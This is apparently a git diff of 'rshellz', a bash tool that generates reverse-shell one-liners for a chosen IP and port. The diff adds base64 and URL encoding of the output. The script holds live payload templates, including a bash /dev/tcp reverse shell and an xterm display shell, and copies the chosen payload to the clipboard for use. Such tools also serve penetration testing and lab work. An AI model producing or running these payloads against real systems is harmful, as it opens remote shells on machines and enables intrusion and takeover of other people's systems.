@@ -1,6 +1,6 @@
 #!/bin/bash
 # title: rshellz
-# version: 1.0
+# version: 1.1
 # author: https://github.com/brsalcedom (Cervant)
 
 greenC="\e[0;32m\033[1m" 
@@ -14,8 +14,8 @@ grayC="\e[0;37m\033[1m"
 script_name=$(basename $0)
 	
 if [ ! "$(command -v xclip)" ]; then
-  echo -e "\n${redC}[!]${endC} Please install ${yellowC}xclip${endC} to use this tool\n"
-  exit 0
+	echo -e "\n${redC}[!]${endC} Please install ${yellowC}xclip${endC} to use this tool\n"
+	exit 0
 fi
 
 banner () {
@@ -34,65 +34,107 @@ banner () {
 
 helpPanel () {
 	banner
-	echo -e "\n${redC}[!] Please provide arguments to run the script."
 	echo -e "\n${grayC}[+] Usage: $script_name -t bash -i 10.0.0.1 -p 443"
 	echo -e "\n\t${yellowC}-h\t\t:${endC} ${blueC}Show this help panel${endC}"
 	echo -e "\t${yellowC}-t SHELL\t:${endC} ${blueC}Type of shell${endC}"
 	echo -e "\t${yellowC}-i IP\t\t:${endC} ${blueC}Specify ip address${endC}"
 	echo -e "\t${yellowC}-p PORT\t\t:${endC} ${blueC}Specify port${endC}"
-	echo -e "\t${yellowC}-e\t\t:${endC} ${blueC}Base64 encode${endC}"
+	echo -e "\t${yellowC}-e ENCODING\t:${endC} ${blueC}Encode to base64 or urlencode${endC}"
 	echo -e "\t${yellowC}-q\t\t:${endC} ${blueC}Hide banner${endC}\n"
 }
 	
 parameter_counter=0 
 
-while getopts ":h:t:i:p:eq" arg
+while getopts ":h:t:i:p:e:q" arg
   do
     case $arg in
       (t) shell_type=$OPTARG  && let parameter_counter+=1 ;;
       (i) ip_address=$OPTARG  && let parameter_counter+=1 ;;
       (p) local_port=$OPTARG  && let parameter_counter+=1 ;;
-      (e) encoding=true ;;
+      (e) encoding=$OPTARG && let parameter_counter+=1 ;;
       (q) quiet=true ;;
       (h) helpPanel ;;
     esac
-  done
-  if [[ $parameter_counter -lt 3 ]]; then
+done
+if [[ $parameter_counter -lt 3 ]]; then
     helpPanel
-  else
-  if [[ -z $(echo $ip_address | grep -oP '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') ]]; then
-  	if [[ -z $quiet ]]; then
-  		banner
+else
+    if [[ -z $quiet ]];then banner; fi
+  	if [[ $parameter_counter -eq 4 ]]; then
+	 if [[ -z $(echo $encoding | grep -oP '(^urlencode$)|(^base64$)') ]]; then
+    	   echo -e "\n${redC}[!] Please provide a valid encoding option: ${blueC}\n\n- base64\n- urlencode${endC}"
+	   exit 0
+	 fi
+	fi
+
+  	if [[ -z $(echo $ip_address | grep -oP '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') ]]; then
+    	 echo -e "\n${redC}[!] Please provide a valid ip address.${endC}"
+    	 exit 0
   	fi
-    echo -e "\n${redC}[!] Please provide a valid ip address.${endC}"
-    exit 0
-  fi
-  if [[ -z $(echo $local_port | grep -oP '^\d{1,5}$') ]]; then
-  	if [[ -z $quiet ]]; then
-  		banner
+  	if [[ -z $(echo $local_port | grep -oP '^\d{1,5}$') ]]; then
+    	 echo -e "\n${redC}[!] Please provide a valid port.${endC}"
+    	 exit 0
   	fi
-    echo -e "\n${redC}[!] Please provide a valid port.${endC}"
-    exit 0
-  fi
+
+  b64encode() {
+	 encoded=$(echo -n "$1" | base64 -w 0)
+	 echo "$encoded"
+  }
+
+  urlencode() {
+  	   encoded=$(echo "$@" | sed \
+        -e 's/%/%25/g' \
+        -e 's/ /%20/g' \
+        -e 's/!/%21/g' \
+        -e 's/"/%22/g' \
+        -e "s/'/%27/g" \
+        -e 's/#/%23/g' \
+        -e 's/(/%28/g' \
+        -e 's/)/%29/g' \
+        -e 's/+/%2b/g' \
+        -e 's/,/%2c/g' \
+        -e 's/-/%2d/g' \
+        -e 's/:/%3a/g' \
+        -e 's/;/%3b/g' \
+        -e 's/?/%3f/g' \
+        -e 's/@/%40/g' \
+        -e 's/\$/%24/g' \
+        -e 's/\&/%26/g' \
+        -e 's/\*/%2a/g' \
+        -e 's/\./%2e/g' \
+        -e 's/\//%2f/g' \
+        -e 's/\[/%5b/g' \
+        -e 's/\\/%5c/g' \
+        -e 's/\]/%5d/g' \
+        -e 's/\^/%5e/g' \
+        -e 's/_/%5f/g' \
+        -e 's/`/%60/g' \
+        -e 's/{/%7b/g' \
+        -e 's/|/%7c/g' \
+        -e 's/}/%7d/g' \
+	-e 's/~/%7e/g')
+	echo "$encoded"
+  }
+
   print_shell () {
-  	if [[ -z $quiet ]]; then
-  		banner
-  	fi
-    shell1=$1
-    shell2=$2
-  if [[ $encoding ]]; then
-    shell1=$(echo -n "$shell1" | base64 -w 0)
-    if [[ -n "$2" ]]; then
-      shell2=$(echo -n "$shell2" | base64 -w 0)
-    fi
-  fi
-    echo $shell1 | tr -d '\n' | xclip -sel clip 2>/dev/null
-    echo -e "\n${grayC}Your reverse shell: ${blueC}(copied to clipboard)${endC}"
-    echo -e "\n\t${greenC}[+] ${turquoiseC}${shell1}${endC}"
-  if [[ -n "$2" ]]; then
-    echo -e "\n${grayC}Alternative shell:${endC}"
-    echo -e "\n\t${greenC}[+] ${turquoiseC}${shell2}${endC}"
-  fi
+	shell_count=0
+	for shell in "$@"; do
+		if [[ $encoding = "base64" ]]; then
+    			shell=$(b64encode "$shell")
+		fi
+		if [[ $encoding = "urlencode" ]]; then
+			shell=$(urlencode "$shell")
+		fi
+		let shell_count+=1
+		if [[ $shell_count -eq "1" ]]; then
+    			echo -e "\n${grayC}Your reverse shell: ${blueC}(copied to clipboard)${endC}"
+    			echo -e "\n\t${greenC}[+] ${turquoiseC}${shell}${endC}"
+    			echo $shell | tr -d '\n' | xclip -sel clip 2>/dev/null
+		elif [[ $shell_count -gt "1" ]]; then
+    			echo -e "\n${grayC}Alternative shell:${endC}"
+    			echo -e "\n\t${greenC}[+] ${turquoiseC}${shell}${endC}"
+		fi
+  	done
   }
   case $shell_type in
     (bash) reverse_shell="bash -i >& /dev/tcp/$ip_address/$local_port 0>&1"
@@ -116,9 +158,7 @@ p.waitFor();"
     (xterm) reverse_shell="xterm -display $ip_address:$local_port" 
       print_shell "$reverse_shell" ;;
     (*) 
-      if [[ -z $quiet ]]; then
-        banner
-      fi
-      echo -e "\n${grayC}Please choose one of the following:\n${blueC}\n- bash\n- perl\n- php\n- python\n- ruby\n- netcat\n- java\n- xterm${endC}" ;;
-    esac
-  fi
+      if [[ -z $quiet ]]; then banner; fi
+      echo -e "\n${redC}[!] Please choose one of the following:\n${blueC}\n- bash\n- perl\n- php\n- python\n- ruby\n- netcat\n- java\n- xterm${endC}" ;;
+  esac
+fi
